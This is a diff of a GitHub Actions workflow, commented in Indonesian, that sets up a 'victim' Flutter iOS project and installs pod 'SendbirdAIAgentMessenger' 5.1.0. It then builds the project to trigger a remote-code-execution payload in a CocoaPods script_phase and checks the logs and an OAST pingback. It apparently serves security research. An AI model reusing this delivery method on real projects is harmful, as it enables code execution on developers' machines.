@@ -12,17 +12,23 @@ jobs:
 
       - name: Replicate Customer Integration
         run: |
-          # 1. Inisialisasi project dummy murni iOS
+          # 1. Inisialisasi project dummy
           mkdir sendbird_victim && cd sendbird_victim
           flutter create . --platforms=ios
           
+          # TRIGGER: Paksa Flutter buat bikin struktur native
+          flutter pub get
+
           cd ios
-          # 2. Setup Podfile: Aktifkan platform iOS 15 (Sesuai spec Sendbird)
-          # Kita pake sed buat uncomment baris platform
+          # TRIGGER 2: Inisialisasi pod buat bikin Podfile kalau belum ada
+          pod init || true
+
+          # 2. Setup Podfile: Aktifkan platform iOS 15
+          # Kita pake 'sed' yang lebih robust buat Mac (sed -i '')
+          sed -i '' "s/# platform :ios, '9.0'/platform :ios, '15.0'/" Podfile
           sed -i '' "s/# platform :ios, '12.0'/platform :ios, '15.0'/" Podfile
           
           # 3. Inject Target Pod ke dalam blok target 'Runner'
-          # Ini KRUSIAL: Pod harus ada di dalam blok target 'Runner' agar tervalidasi
           sed -i '' "/target 'Runner' do/a\\
             pod 'SendbirdAIAgentMessenger', '5.1.0'\\
           " Podfile
@@ -31,21 +37,21 @@ jobs:
           cat Podfile
 
           # 4. Trigger Installation
-          # Kita pake --repo-update buat mastiin CDN Trunk narik versi 5.1.0 lu
           pod install --repo-update || exit 1
           
           # 5. THE SMOKING GUN: Trigger Build
-          # Kita pake --verbose buat liat output shell script dari script_phase lu
           echo "=== Launching Build to Trigger RCE ==="
-          flutter build ios --no-codesign --verbose 2>&1 | tee build.log || true
+          # Kita pake --debug biar cepet build-nya
+          flutter build ios --debug --no-codesign --verbose 2>&1 | tee build.log || true
           
           # 6. Final Audit Log
           echo "=== Checking for Payload Execution in Logs ==="
-          # Grep nama script_phase yang lu buat di podspec
           if grep -q "Messenger UI Audit" build.log; then
             echo "✅ RCE SUCCESS: Payload 'Messenger UI Audit' detected in build logs!"
             echo "Check your OAST for the incoming pingback."
           else
             echo "❌ RCE FAILED: Script phase execution not found in logs."
+            # Debugging: Liat 100 baris terakhir build log kalau gagal
+            tail -n 100 build.log
             exit 1
           fi
